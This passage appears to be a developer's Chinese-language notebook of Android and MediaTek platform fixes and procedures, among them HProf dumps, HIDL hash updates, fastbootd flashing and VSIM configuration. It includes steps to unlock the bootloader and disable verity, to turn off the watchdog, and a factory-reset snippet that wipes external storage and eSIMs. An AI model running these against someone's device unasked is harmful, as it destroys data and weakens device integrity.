01-03 00:59:23.134  5089  5490 E MtpDatabaseJNI:  at android.content.ContentProviderClient.update(ContentProviderClient.java:376)
01-03 00:59:23.134  5089  5490 E MtpDatabaseJNI:  at android.mtp.MtpDatabase.renameFile(MtpDatabase.java:579)
01-03 00:59:23.134  5089  5490 E MtpDatabaseJNI:  at android.mtp.MtpDatabase.setObjectProperty(MtpDatabase.java:698)
01-03 00:59:23.134  5089  5490 E MtpDatabaseJNI:  at android.mtp.MtpServer.native_run(Native Method)
01-03 00:59:23.134  5089  5490 E MtpDatabaseJNI:  at android.mtp.MtpServer.run(MtpServer.java:116)
01-03 00:59:23.134  5089  5490 E MtpDatabaseJNI:  at java.lang.Thread.run(Thread.java:919)

原因应该是在 frameworks/base/core/java/android/os/storage/VolumeInfo.java 中路径给改了
public File getInternalPathForUser(int userId) {
    if (path == null) {
        return null;
    } else if (type == TYPE_PUBLIC || type == TYPE_STUB) {
        // TODO: plumb through cleaner path from vold
        return new File(path.replace("/storage/", "/mnt/media_rw/"));   // 这里把路径改了
    } else {
        return getPathForUser(userId);
    }
}

修改方法如下，不确定是否会有其他问题:
packages/providers/MediaProvider/src/com/android/providers/media/MediaProvider.java
private static void assertFileColumnsSane(int match, Uri uri, ContentValues values)
        throws VolumeArgumentException {
    if (!values.containsKey(MediaColumns.DATA)) return;
    try {
        // Sanity check that the requested path actually lives on volume
        final String volumeName = resolveVolumeName(uri);
        final Collection<File> allowed = getVolumeScanPaths(volumeName);
-        final File actual = new File(values.getAsString(MediaColumns.DATA))
+        final File actual = new File(values.getAsString(MediaColumns.DATA).replaceAll("/mnt/media_rw/", "/storage/"))
                .getCanonicalFile();
        if (!FileUtils.contains(allowed, actual)) {
            throw new VolumeArgumentException(actual, allowed);
        }
    } catch (IOException e) {
        throw new IllegalArgumentException(e);
    }
}
```

## Preconditions 非空判断

```text Java
frameworks/base/core/java/com/android/internal/util/Preconditions.java
com.android.internal.util.Preconditions.checkNotNull(storage);

@UnsupportedAppUsage
public static @NonNull <T> T checkNotNull(final T reference) {
    if (reference == null) {
        throw new NullPointerException();
    }
    return reference;
}
```

## [性能] HProf (Heap Profile)

```text
1) 功能： 
用于java层面的内存分析，显示详细的内存占用信息，指出可疑的内存泄漏对象

2) 方法：

a) 在代码中加入dump动作

import android.os.Debug;
import java.io.IOException;
try {
    android.os.Debug.dumpHprofData(“/data/tmp/input.hprof”); // 先建/data/tmp目录      
} catch (IOException ioe) {
    ioe.printStackTrace();
} 
b) 把hprof文件复制到PC端

$ adb pull /data/tmp/input.hprof ./ 
c) 使用命令hprof-conv把hprof转成MAT识别的标准的hprof

$ $ANDROID_SRC/out/host/linux-x86/bin/hprof-conv input.hprof output.hprof 
d) 使用MAT工具看hprof信息

下载MAT工具：http://www.eclipse.org/mat/downloads.php

用工具打开output.hprof

3) 注意：此工具只能显示java层面的，而不能显示Ｃ层的内存占用信息
```

## adb 发送启动 mtklog 的广播无响应

```text
01-03 12:14:57.401   758   854 W BroadcastQueue: Background execution not allowed: receiving Intent { act=com.debug.loggerui.ADB_CMD flg=0x400010 (has extras) } to com.debug.loggerui/.framework.LogReceiver

P之后不允许后台发送广播，需要添加一个 flag, -f 0x01000000
adb shell am broadcast -a com.debug.loggerui.ADB_CMD -e cmd_name switch_taglog --ei cmd_target 23 -f 0x01000000
adb shell am broadcast -a com.debug.loggerui.ADB_CMD -e cmd_name start --ei cmd_target 23 -f 0x01000000

adb shell am broadcast -a com.debug.loggerui.ADB_CMD -e cmd_name stop --ei cmd_target 23 -f 0x01000000
```

## Android8.1修改hidl编译提示 This interface has been frozen. Do not change it

```text
https://blog.csdn.net/qq_16775897/article/details/78345115
修改了hardware/interfaces中的内容，上图中提示hash值不匹配，重新用hidl-gen -L hash -r对android.hardware.light@2.0::types进行hash值生成的查看。
hidl-gen -L hash -r .:hardware/interfaces android.hardware.light@2.0::types
得到hash值如下：07901694d6862da86034edc174fc8dd1e63637b9a460bcced04ed9e43bc14a5b android.hardware.light@2.0::types
手动修改 hardware/interfaces/current.txt中android.hardware.light@2.0::types 的 hash 值重新编译即可。

./out/soong/host/linux-x86/bin/hidl-gen -L hash -r vendor.mediatek.hardware:vendor/mediatek/proprietary/hardware/interfaces vendor.mediatek.hardware.nvram@1.1::INvram
47e005b45f58e232a448f698bfa576461aea2f3e1cd4955d6a802dca8c740ee9 vendor.mediatek.hardware.nvram@1.1::INvram

也可以直接用 vendor/mediatek/proprietary/hardware/interfaces/update-hash.sh 脚本自动生成，注意只能在 alps 目录下执行，还要将脚本中的两处 hidl-gen 修改为 out/soong/host/linux-x86/bin/hidl-gen

hidl-gen 的代码路径为：system/tools/hidl，编译之后会生成 out/soong/host/linux-x86/bin/hidl-gen

编译之后查看 out/target/common/obj/JAVA_LIBRARIES/vendor.mediatek.hardware.nvram-V1.1-java_intermediates/classes.jar 中是否有 DeleteFile() 方法
```

## 解锁 bootloader

```text
adb remount
E Skipping /system
E Skipping /vendor
E Skipping /product
W No partitions to remount
/system/bin/remount exited with status 7
remount failed

disable-verity
Device is locked. Please unlock the device first
Overlayfs setup failed with error Permission denied
Maybe run adb root?

需要先解锁bootloader，步骤如下
1.首先需要打开开发者模式中的OEM unlocking开关
2.adb reboot bootloader
3.fastboot flashing unlock
4.fastboot getvar unlocked
等待结果 一般会出现unlocked：yes
5.adb root 
6.adb remount
7.adb disable-verity
8.adb reboot

进入fastboot模式之后音量上键不能用，需要找驱动配置一下recovery的音量上键功能
--- a/vendor/mediatek/proprietary/bootable/bootloader/preloader/custom/k39tv1_bsp_512/dct/dct/codegen.dws
+++ b/vendor/mediatek/proprietary/bootable/bootloader/preloader/custom/k39tv1_bsp_512/dct/dct/codegen.dws
@@ -1,5 +1,5 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<!--dct_version="2.5" buid_sn="161102" dws_modification_time="03.22.2019.11:54:55"-->
+<!--dct_version="2.5" buid_sn="161102" dws_modification_time="02.27.2020.09:14:28"-->
 <dct_cfg>
     <general chip="MT6739">
         <proj>MT6739</proj>
@@ -1745,7 +1745,7 @@
                                NC NC NC NC
                                NC NC NC NC</keyMatrix_ext>
             <downloadKey>VOLUMEUP NC POWER</downloadKey>
-            <modeKey>NC NC VOLUMEDOWN</modeKey>
+            <modeKey>NC VOLUMEUP VOLUMEDOWN</modeKey>
             <pwrKeyEint_gpioNum>0</pwrKeyEint_gpioNum>
             <pwrKeyUtility>POWER</pwrKeyUtility>
             <home_key></home_key>

默认解锁 bootloader
在 vendor/mediatek/proprietary/bootable/bootloader/lk/project/k80hd_bsp_fwv_512m.mk 文件中添加 MTK_BUILD_DEFAULT_UNLOCK = yes
```

## [图片] Android矢量图形之VectorDrawable研究

```text
5.0以上支持VectorDrawable了，可以创建vector的xml资源文件。vector其实就使用来绘制矢量图形的。
看一个例子：
<?xml version="1.0" encoding="utf-8"?>
<vector xmlns:android="http://schemas.android.com/apk/res/android" 
    android:height="64dp"
    android:width="64dp"
    android:viewportHeight="100"
    android:viewportWidth="100">
    <path
         android:fillColor="#000000"
         android:pathData="M25,0 l 50,50 -50,50Z"/>

</vector>
首先vector 标签是一个drawable对象，所以是放在res/drawable目录的。

vector 标签下有android:width和android:height属性，这两个属性是必填的，定义矢量图形的绝对大小，虽然说是矢量图形随意缩放，但是不能说这里不定义宽高直接到要设置到的目标控件上定义控件的宽高，这样是不允许的，一定要设置这个绝对宽高，要不然会报错。

然后还有个android:viewportHeight和android:viewportWidth属性，这个是画布宽高，也是必填的，定义Path路径的时候就必须在这个画布大小里去绘制，超出画布就显示不出来了。

path标签android:fillColor属性定义绘制颜色，android:pathData定义绘制路径。

M25,0 l 50,50 -50,50Z这个路径表示：在100*100的画布内，先把绘制点移动到绝对坐标(25,0)这个点，然后画直线到(50,50)这个点，l指令是相对坐标，大写的L表示绝对坐标，那么l 50,50就是在原点(25,0)的x轴往前移50，往下移50，绝对坐标就是(75,50)，也就是三角形的右边那个点。
然后从(50,50)这个点绘制到三角形最下面那个点(-50,50)，这也是相对右边那个点相对坐标，也就是把(75,50)这个绝对坐标当作是原点(0,0),参作这个原点往后移动50再往下移动50，在整个画布中的绝对坐标就是(25，100)

再看一种画法：

M300,70 l 0,-70 70,70 0,0 -70,70z

这个官方的画法，先定点，然后把定点固定在原点垂直上方，然后往右下移确定三角形右边的定点，最后把点水平向后移动70往下移动70，回到原点的水平轴在y轴上移动140.

是先画三角的上半部分再画下半部分。

同样是画上面这个三角形：

先移动到随便一个点：M300，70

然后把线段一端定在三角形下边那个点l 0,70（也就是垂直往下移动了70）

后面再补上三角形右边的点l 0,70 70,70（下面的点x轴和y轴都移动70，就到三角形右边的点）

M300,70 l 0,70 70,-70  这样就把三角形下半段画好了

再补上上半段M300,70 l 0,70 70,-70 -70,-70

如果要把这个三角形旋转角度怎么办?

就要在path外层顶一个group节点,利用这个group对它进行旋转

<vector xmlns:android="http://schemas.android.com/apk/res/android" 
    android:height="64dp"
    android:width="64dp"
    android:viewportHeight="600"
    android:viewportWidth="600">
    
    <group android:pivotX="300.0"
        android:pivotY="300.0"
        android:rotation="45.0">
        
        <path
            android:name="v"
            android:fillColor="#000000"
            android:pathData="M300,70 l 0,-70 70,70 0,0 -70,70"/>
    </group>
</vector>
```

## [工具] vysor 原理以及 Android 同屏方案

```text
https://juejin.im/entry/57fe39400bd1d00058dd4652
```

## framework 切换的时候出现 Can not perform this action after onSaveInstanceState

```text
transaction.commit();
to
transaction.commitAllowingStateLoss();

但是好像没啥用
```

## [工具] KATS 工具，MTK有提供

```text
Kernel Android Time Sync
工具应用背景:以前客户常用的kernel log时间转换工具会忽略睡眠的时间,导致时间不准确,
对功耗类睡眠唤醒问题非常容易误导,这个工具就可以避免这样的问题
```

## [Snippet] 在工厂测试中限制状态栏下拉?

```text
frameworks/base/services/core/java/com/android/server/wm/DisplayPolicy.java
@Override
public void onSwipeFromTop() {
    if (mStatusBar != null) {
        if (mFocusedWindow.getAttrs().packageName.startsWith("com.android.zxl")) {
            return;
        }
        requestTransientBars(mStatusBar);
    }
}
```

## 抓取BQDump的方法

```text
1.下载并解压sf_bqdump.rar；
2.使用userdebug或eng load复现，问题发生后依次运行0_setup.bat、1_SF_bqdump_P.bat；
3.检查SF_bqdump_all -> SF_dump文件夹中是否dump成功；
4.上传Log、视频以及SF_bqdump_all文件夹中的内容
```

## [FAQ22334]  Android Q之后如何单独烧录system/vendor/odm/product img

```text
1. unlock devices
方法1：
Flash user/eng/userdebug full load and bootup to home screen
Settings -> System -> Developer options -> OEM unlocking
"adb reboot bootloader" or "press volume up key + power key and select fastboot"
fastboot flashing unlock (press volumn up key)
 
方法2  rebuild lk to unlock devices
goto lk (vendor/mediatek/proprietary/bootable/bootloader/lk)
add config into "project".mk (ex: project/k79v1_64_tee.mk)
MTK_BUILD_DEFAULT_UNLOCK = yes
rebuild lk
单独烧录lk  (lk需同一codebase编译生成)
2.  进入fastbootd界面
 
方法1  通过fastboot mode 命令进fastbootd

adb reboot bootloader (will enter fastboot mode)
fastboot reboot fastboot(will enter fastbootd mode)

方法2   adb命令进fastbootd界面
adb reboot fastboot  

这会使系统通过recovery mode这路来启动kernel，init会再启动fastbootd service
对应关键log:
lk:
[3335]  lk boot mode = 2  //2->recovery mode
kernel:
[4.750413]  <5>.(5)[1:init] init 3: starting service 'fastbootd'...

fastbootd处理cmd log:
[ 881.401962]  <0>.(0)[311:fastbootd] fastbootd: Fastboot command: reboot
[ 881.404127]  <1>.(1)[1:init] init 3: Received sys.powerctl='reboot,from_fastboot' from pid: 311 (/system/bin/fastbootd)
[ 881.405655]  <1>.(1)[1:init] init 14: ReapLogF PropSet [sys.powerctl] =[reboot,from_fastboot] 881.400581 Done

3. 烧录system/vendor/odm/product.img

fastboot  flash <part name>  <img>
ex:
fastboot  flash system  system.img

关键log:
[ 183.792283]  <0>.(0)[317:fastbootd] fastbootd: Fastboot command: flash:system
[ 183.895364]  <3>.(3)[317:fastbootd] fastbootd: [libfs_mgr] Created logical partition system on device /dev/block/dm-0
 
P.s.
fastbootd source code is in system/core/fastboot/device,
 
also you can refer to system/core/fastboot/README.md
```

## [知识点] 如何判断CPU是32位还是64位

```text
可以利用三种方式来判断CPU是32位还是64位：
1. 读取Android 的system property ("ro.product.cpu.abilist64")来判断
2. 读取"/proc/cpuinfo"文件的第一行来判断
3. 读取libc.so文件的ELF头部e_indent[] 数组，根据数组第e_indent[4] 的取值来判断
```

## [snippet] 恢复出厂设置

```text
/**
 * 恢复出厂设置，需要系统权限，以及系统签名 android:sharedUserId="android.uid.system"
 */
public void resetSystem() {
    Intent intent = new Intent("android.intent.action.FACTORY_RESET");
    //8.0
    // intent = new Intent("android.intent.action.MASTER_CLEAR");
    //9.0
    intent.addFlags(Intent.FLAG_RECEIVER_FOREGROUND);
    intent.setPackage("android");

    //以上区分不同系统
    intent.putExtra("android.intent.extra.REASON", "FactoryMode");
    //是否擦除SdCard
    intent.putExtra("android.intent.extra.WIPE_EXTERNAL_STORAGE", true);
    intent.putExtra("android.intent.extra.EXTRA_WIPE_ESIMS", true);
    sendBroadcast(intent);
}
```

## [知识点] 在 Android 中如何确定 App(Activity) 的启动者

```text
最近在帮忙定位一个问题，涉及到某个应用自动启动了，为了确定是谁调用的，使用如下的日志进行查看（注：为了简单考虑，下面的启动者为launcher）

adb logcat | grep -E "ActivityManager: START" --color=always
I ActivityManager: START u0 {act=android.intent.action.MAIN
cat=[android.intent.category.HOME]  flg=0x10000000 hwFlg=0x10
cmp=com.huawei.android.launcher/.unihome.UniHomeLauncher (has extras)} from uid 10070
我们看最后看到这个from uid 10070，嗯，基本定位到了是这个uid的应用启动了。

确定 uid 10070 是哪个 App
确定uid不能说明问题，我们至少需要确定是哪个应用，我们尝试使用下面的命令过滤进程有关数据

adb shell ps | grep 10070
没有任何数据输出
然而一无所获。

当然前面说了，示例的启动者是launcher，那我们过滤一下launcher

adb shell ps | grep launcher
u0_a70        2207   620 4979992 156312 0                   0 S com.huawei.android.launcher
我们发现了u0_a70和10070貌似有一些关联（至少都含有70）

于是我们使用下面的命令确定id

adb shell id u0_a70
uid=10070(u0_a70) gid=10070(u0_a70) groups=10070(u0_a70), context=u:r:shell:s0
果然，u0_a70和10070 是有关联的

u0_a70 的含义
u0 默认的手机第一个用户（可以通过设置里面的多用户新增和切换）
a 代表app
70 代表着第70个应用
转换公式
简单而言，对应的公式是这样

u0_a70 = “u0_” + “a” + (uid(这里是10070) – FIRST_APPLICATION_UID(固定值10000))

具体复杂的转换，请参考这段代码

/**
 * Generate a text representation of the uid, breaking out its individual
 * components -- user, app, isolated, etc.
 * @hide
 */
public static void formatUid(StringBuilder sb, int uid) {
    if (uid < Process.FIRST_APPLICATION_UID) {
        sb.append(uid);
    } else {
        sb.append('u');
        sb.append(getUserId(uid));
        final int appId = getAppId(uid);
        if (isIsolated(appId)) {
            if (appId > Process.FIRST_ISOLATED_UID) {
                sb.append('i');
                sb.append(appId - Process.FIRST_ISOLATED_UID);
            } else {
                sb.append("ai");
                sb.append(appId - Process.FIRST_APP_ZYGOTE_ISOLATED_UID);
            }
        } else if (appId >= Process.FIRST_APPLICATION_UID) {
            sb.append('a');
            sb.append(appId - Process.FIRST_APPLICATION_UID);
        } else {
            sb.append('s');
            sb.append(appId);
        }
    }
}
部分常量

/**
 * Defines the start of a range of UIDs (and GIDs), going from this
 * number to {@link #LAST_APPLICATION_UID} that are reserved for assigning
 * to applications.
 */
public static final int FIRST_APPLICATION_UID = 10000; 
/**
 * Last of application-specific UIDs starting at
 * {@link #FIRST_APPLICATION_UID}.
 */
public static final int LAST_APPLICATION_UID = 19999; 
/**
 * First uid used for fully isolated sandboxed processes (with no permissions of their own)
 * @hide
 */
@UnsupportedAppUsage
@TestApi
public static final int FIRST_ISOLATED_UID = 99000; 
/**
 * First uid used for fully isolated sandboxed processes spawned from an app zygote
 * @hide
 */
@TestApi
public static final int FIRST_APP_ZYGOTE_ISOLATED_UID = 90000; 
以上。
```

## [FAQ21279]  [SIM] AP VSIM introduction

```text
本FAQ介绍AP VSIM这个feature，注意它不同于Modem VSIM（可参考FAQ03223），本FAQ中以下提到的VSIM都是指AP VSIM.
Q: 什么是VSIM?
A: VSIM（Virtual SIM）是用软件的方式实现一张实体卡的功能，使终端用户只通过软件操作就可以使用Data等功能。
 
Q: VSIM的分类.
A: VSIM可分为Soft SIM和Remote SIM，Soft SIM在手机local存储所有的SIM信息（包括Authentication key），SIM的鉴权在local完成。Remote SIM的Authentication key等信息存在Server端，鉴权时由手机通过另一张SIM卡把鉴权请求发到Server端，Server把鉴权结果返回给手机。
 
Q: MTK VSIM方案有哪些?
A: MTK VSIM分为VSIM1.0、VSIM2.0和VSIM3.0三个世代：
VSIM1.0支持Soft SIM和在DSDA平台上支持Remote SIM
VSIM2.0只支持Soft SIM，支持VSIM不占实体卡槽, 因TSTS平台不支持TD-SCDMA和C2K，所以只有4模以下Project可开TSTS版本。
VSIM3.0支持Soft SIM和在DSDS/TSTS平台上支持Remote SIM, 因为它需要MULTIPLE_PS, 而MULTIPLE_PS不支持TD-SCDMA和C2K，所以VSIM3.0只能开在4模及以下Project.
 
Q: MTK VSIM分别在哪些平台支持?
A:
VSIM1.0： Android M以上，除了Rainer和WR8 modem之外，所有平台皆支持
VSIM2.0：
alps-mp-m0.mp11 (申請ALPS02619579)
alps-mp-m0.mp9 (申請ALPS02619579, only support DSDS since 91 modem not support TSTS.)
Android N以上，除了Rainer和WR8 modem之外，所有平台皆支援。（部分平台不支援TSTS）
VSIM3.0：
alps-mp-n0.mp5 (申请AP: ALPS03334287 Modem: MOLY00250899）
alps-mp-n0.mp7（申请AP: ALPS03038675 (MPS), ALPS03334380 (VSIM 3.0) Modem: MOLY00250899）
alps-mp-o1.mp1 （申请AP: ALPS04019418 Modem需升级到MOLY.LR12A.R3.MP W18.36以后版本）
alps-mp-o1.mp3（Default就支持，无需申请Patch ID）
alps-mp-o1.mp7（申请AP: ALPS04019873 Modem需升级到MOLY.LR12A.R3.MP W18.36以后版本）
Android P以上，除了Rainer和WR8 modem之外，所有平台皆支援。（部分平台不支援TSTS）
 
Q: 怎样Enable VSIM功能
A: VSIM是License feature，需要首先通过CPM申请到VSIM License才可以拿到VSIM的code。请邮件提供如下信息向CPM申请：
項目平台
MP時間
出貨國家地區
合作第三方
使用的是soft SIM還是Remote SIM
是否有賣中國本地流量(包含中移/聯通/中國電信)
在取得License之后：
如果是Android P以后的版本，请用git sync以下repo:
vendor/mediatek/proprietary/external/vsimadaptorclient
vendor/mediatek/proprietary/hardware/rilvsim
如果是Android O版本，并且已经导入Common Git
请用git sync vendor\mediatek\proprietary\external\vsimadaptorclient
如果是MT6292及之前的modem，请用git sync vendor/mediatek/libs/mtk-ril-prop-vsim
如果是MT6293及之后的modem，请用git sync vendor/mediatek/libs/libmtk-fusion-ril-prop-vsim
如果没有导入Common git或者Android N及之前版本，如果没有vendor/mediatek/proprietary/external/vsimadaptorclient这个folder，请向MTK申请Patch；如果有，请参考如下各版本需求。
如果要开VSIM1.0，只需设定AP ProjectConfig自行build：
MTK_EXTERNAL_SIM_SUPPORT=yes
如果要开VSIM2.0的[DSDS: 雙卡手機 + VSIM會佔卡槽] ，只需设定AP ProjectConfig自行build：
MTK_MULTI_SIM_SUPPORT=dsds
MTK_NUM_MODEM_PROTOCOL=2
MTK_EXTERNAL_SIM_SUPPORT=yes
MTK_EXTERNAL_SIM_ONLY_SLOTS=0
如果要开VSIM2.0的[DSDS: 單卡手機 + 額外一張VSIM] ，只需设定AP ProjectConfig自行build：
MTK_MULTI_SIM_SUPPORT=dsds
MTK_NUM_MODEM_PROTOCOL=2
MTK_EXTERNAL_SIM_SUPPORT=yes
MTK_EXTERNAL_SIM_ONLY_SLOTS=2
如果要开VSIM2.0的[TSTS: 雙卡手機 + 額外一張VSIM]  (Modem須為有支援TSTS平台)，需要向MTK申请TSTS Modem：
AP Feature Option
MTK_MULTI_SIM_SUPPORT=tsts
MTK_NUM_MODEM_PROTOCOL=3
MTK_PROTOCOL1_RAT_CONFIG=Lf/Lt/W/G (4模以下)
MTK_EXTERNAL_SIM_SUPPORT=yes
MTK_EXTERNAL_SIM_ONLY_SLOTS=4
Modem Option
GEMINI = 3
SIM_SWTICH_CONTROLLER_MT6306 = FALSE
如果要开VSIM3.0的[TSTS: 雙卡手機 + 額外一VSIM]  (Modem須為有支援TSTS平台)，需要向MTK申请TSTS Modem Patch：
AP Feature Option
MTK_ENABLE_MD3=no
MTK_EXTERNAL_SIM_SUPPORT=yes
MTK_EXTERNAL_SIM_ONLY_SLOTS=4
MTK_EXTERNAL_SIM_RSIM_ENHANCEMENT=yes
MTK_IRAT_SUPPORT=no
MTK_MULTI_PS_SUPPORT=yes
MTK_MULTI_SIM_SUPPORT=tsts
MTK_NUM_MODEM_PROTOCOL=3
MTK_PROTOCOL1_RAT_CONFIG=Lf/Lt/W/G
MTK_MD1_SUPPORT=9
MTK_MD3_SUPPORT=0
MTK_IRAT_SUPPORT=no
MTK_C2K_LTE_MODE=0
MTK_ECCCI_C2K=yes
Kernel Config
CONFIG_MTK_MD1_SUPPORT=9
CONFIG_MTK_MD3_SUPPORT=0
Remove CONFIG_MTK_IRAT_SUPPORT
CONFIG_MTK_C2K_LTE_MODE=0
CONFIG_MTK_ECCCI_C2K=yes
Bootloader(vendor/mediatek/proprietary/bootable/bootloader/lk/project/${MTK_TARGET_PROJECT}.mk)
MTK_PROTOCOL1_RAT_CONFIG=Lf/Lt/W/G
Modem Option
RSIM_SINGLE_RF_SUPPORT=TRUE // No need for MT6293 and after
GEMINI = 3
GEMINI_W = 3
MULTIPLE_PS=TRUE
SIM_HOT_SWAP = SIM_SLOT_3
SIM_SWTICH_CONTROLLER_MT6306 = FALSE
如果要开VSIM3.0的[DSDS: 單卡手機 + 額外一張VSIM or 雙卡手機 + VSIM會佔卡槽] ，需要向MTK申请Modem Patch：
AP Feature Option
MTK_ENABLE_MD3=no
MTK_EXTERNAL_SIM_SUPPORT=yes
MTK_EXTERNAL_SIM_ONLY_SLOTS=0
MTK_EXTERNAL_SIM_RSIM_ENHANCEMENT=yes
MTK_MULTI_PS_SUPPORT=yes
MTK_MULTI_SIM_SUPPORT=dsds
MTK_NUM_MODEM_PROTOCOL=2
MTK_PROTOCOL1_RAT_CONFIG=Lf/Lt/W/G
MTK_MD1_SUPPORT=9
MTK_MD3_SUPPORT=0
MTK_IRAT_SUPPORT=no
MTK_C2K_LTE_MODE=0
MTK_ECCCI_C2K=yes
Kernel Config
CONFIG_MTK_MD1_SUPPORT=9
CONFIG_MTK_MD3_SUPPORT=0
Remove CONFIG_MTK_IRAT_SUPPORT
CONFIG_MTK_C2K_LTE_MODE=0
CONFIG_MTK_ECCCI_C2K=yes
Bootloader(vendor/mediatek/proprietary/bootable/bootloader/lk/project/${MTK_TARGET_PROJECT}.mk)
MTK_PROTOCOL1_RAT_CONFIG=Lf/Lt/W/G
Modem Option
RSIM_SINGLE_RF_SUPPORT=TRUE // No need for Gen93 and after
GEMINI =2 
GEMINI_W = 2
MULTIPLE_PS=TRUE
SIM_HOT_SWAP = SIM_SLOT_2
SIM_SWTICH_CONTROLLER_MT6306 = FALSE 
 
Q: 需要为VSIM配IMEI吗?
A: Project开成几卡就需要配几个IMEI，跟有几个实体卡槽无关，比如Project开的是TSTS，就需要配3个IMEI.
 
Q: 怎样维护TSTS Project?
A: 如果Project要开成TSTS，因为Modem配置成TSTS需要由MTK完成，所以如果用现有Project直接向MTK申请配置成TSTS的话，会把现有Project的Modem更新成TSTS modem，后续release也将变成TSTS的，所以如果希望避免开VSIM影响基于现有Project的其他项目，建议为VSIM单独申请一个eService Project, 这样就会有两个Project，如果两个Project都各自单独维护则可不care下面几点，而如果希望两个Project共用一套AP代码的话，需要确保如下几点：
    1. eService上有两个Project，一个用作DSDS项目，一个用作TSTS项目。
    2. 两个Project使用并锁定为同一个基线版本。
    3. DSDS Project保持默认，TSTS Project申请并集成modem侧TSTS Patch。
    4. 两个Project，Modem保证永远只是一个TSTS，一个DSDS的配置区别。
    5. AP共用一套代码，不同项目有不同的ProjectConfig，搭配两个Project中适合项目的那个Modem。
    6. 后续有任何定期释放的patch，或者解决各种bug（包括VSIM相关）的patch， 两个Project都统一一致去申请。
    7. DSDS Project正常维护AP代码，负责合入申请到的各种patch。
    8. TSTS Project只关注MD patch的合入。AP可以不管。
 
Q: 如果不希望创建两个Project分别维护DSDS和TSTS项目，有没有其他办法?
A: 因为AP DSDS和TSTS可以通过ProjectConfig自行切换，但是modem不支持客户自行切换，所以如果希望只用一个Project同时支持DSDS和TSTS的话，这个Project在申请时必须开成TSTS的modem，然后在AP ProjectConfig里面分别配置成DSDS和TSTS，这种方式也支持OTA升级（比如AP DSDS + MD TSTS 软件 OTA升级到 AP TSTS + MD TSTS软件）。采用这个方法请做好基本功能验证（能识别SIM卡，Call/SMS/Data都没有问题）。
因为TSTS的modem只支持L/W/G, 所以如果需要支持TDSCDMA或者C2K，则不能用此方法。
 
Q: 申请VSIM patch注意事项
A: 请首先发mail给CPM，在CPM开好License之后再申请Patch，如果要开TSTS版本，还需要参考上一条“怎样维护TSTS Project”为VSIM开好Project之后，再在新的VSIM Project上面申请Patch，否则将会无法release patch或者release的patch覆盖之前DSDS的project.
 
Q: VSIM issue怎么处理?
A: 因为VSIM上层App由第三方提供，对于VSIM的issue，请首先找VSIM App提供方做第一手分析，经过分析之后如果确认是MTK Framework问题，请再提供必要log信息说明是MTK哪个Interface行为不符合预期给MTK分析。
 
Q: VSIM socket断连问题
A: 如果在log中有看到ExternalSimMgr: [vsim-adaptor]  VsimIoThread IOException， 这个问题一般是因为socket断连，请VSIM App owner首先确认一下是否是App断开了socket（比如App被kill）
 
Q: VSIM enable之后Default data切换问题
A: 因为VSIM3.0在enable remote SIM之后，不允许把default data切到非remote SIM的SIM卡，所以如果客户系统有做客制化自动切换default data的逻辑，请注意可能需要添加逻辑在enable remote SIM之后避免切default data到非remote SIM。
```

## [FAQ22655]  How To Disable Watchdog

```text
[DESCRIPTION] 
有时候存在：(1)死机无法抓取得memory dump或是(2)用JTAG分析问题时watchdog timeout了， 可以关闭watchdog去debug 问题.

[SOLUTION] 
watchdog会在preloader/lk/kernel中都存在driver，不同的project，watchdog enable or disable的情况会不同。
分别说明在preloader/lk/kernel disable watchdog的方法：

1. preloader：
bootable/bootloader/preloader/custom/xxxxx/cust_bldr.mak
将CFG_APWDT_DISABLE setting为1

2.lk：
bootable/bootloader/lk/platform/mtxxxx/include/platform/mtk_wdt.h
将LK_WDT_DISABLE setting为1

3. kernel：
watchdog kernel driver分为两个版本：turnkey 和 upstream

(1) turnkey:
CMD: echo 0 20 30 0 0 > /proc/wdk
最后一个参数打为1，表明enable watchdog；打为0，表明disable watchdog
cmd下过后，可以使用cat /proc/wdk cmd来check enable or disable 状态

(2) upstream:
echo 0 30 > /proc/wdk
第一个参数打为1，表明enable watchdog；打为0，表明disable watchdog
cmd下过后，可以使用cat /proc/wdk cmd来check enable or disable 状态
```

## [FAQ23040]  IllegalArgumentException: NotificationChannelGroup doesn't exist

```text
[DESCRIPTION] 
"java.lang.IllegalArgumentException: NotificationChannelGroup doesn't exist",
"\tat com.android.server.notification.PreferencesHelper.createNotificationChannel(PreferencesHelper.java:631)",
"\tat com.android.server.notification.NotificationManagerService$10.createNotificationChannelsImpl(NotificationManagerService.java:2672)",
"\tat com.android.server.notification.NotificationManagerService$10.createNotificationChannels(NotificationManagerService.java:2693)",
"\tat android.app.NotificationManager.createNotificationChannels(NotificationManager.java:710)",
"\tat android.app.NotificationManager.createNotificationChannel(NotificationManager.java:698)",
"\tat com.android.server.wm.AlertWindowNotification.createNotificationChannel(AlertWindowNotification.java:168)",
"\tat com.android.server.wm.AlertWindowNotification.onPostNotification(AlertWindowNotification.java:110)",
"\tat com.android.server.wm.AlertWindowNotification.lambda$iVtcJMb6VtqtAgEtGUDCkGay0tM(Unknown Source:0)",
"\tat com.android.server.wm.-$$Lambda$AlertWindowNotification$iVtcJMb6VtqtAgEtGUDCkGay0tM.run(Unknown Source:2)",
"\tat android.os.Handler.handleCallback(Handler.java:883)",
"\tat android.os.Handler.dispatchMessage(Handler.java:100)",
"\tat android.os.Looper.loop(Looper.java:214)",
"\tat android.os.HandlerThread.run(HandlerThread.java:67)",
"\tat com.android.server.ServiceThread.run(ServiceThread.java:44)",

复现步骤有两种：
1.MTFB
2.手机安装某些应用后，在设置里点击重置偏好设置，手机就会重启。user版本必现，eng没有问题。目前发现google对比机也有这个问题的。

[SOLUTION] 
 
导致问题的原因是AlertWindowNotification和NotificationManager之间信息不同步。
AlertWindowNotification自己保存了一套它自己创建的NotificationChannelGroup，并通过判断这个是不是null来作为是否重新创建NotificationChannelGroup的依据:
private void createNotificationChannel(Context context, String appName) {
    if (sChannelGroup == null) {
        sChannelGroup = new NotificationChannelGroup(CHANNEL_PREFIX,
                mService.mContext.getString(
                        R.string.alert_windows_notification_channel_group_name));
        mNotificationManager.createNotificationChannelGroup(sChannelGroup);
    }

    ... ...
    mNotificationManager.createNotificationChannel(channel);
}

在清除数据时，NotificationManager这边保存的NotificationChannelGroup信息被清理掉了，AlertWindowNotification自己保存的sChannelGroup没有被清理，这就导致它在下次create NotificationChannel的时候并不会重新创建NotificationChannelGroup，导致NotificationManager这边抛出异常。

可以新增一个判断条件用来检查之前创建的sChannelGroup是否依然存在于ChannelGroup list中。如果返回null说明不存在，也重新创建：
/frameworks/base/services/core/java/com/android/server/wm/AlertWindowNotification.java：
private void createNotificationChannel(Context context, String appName) {
-   if (sChannelGroup == null) {
+   if (sChannelGroup == null || mNotificationManager.getNotificationChannelGroup(sChannelGroup.getId()) == null) {
        ... ...
    }
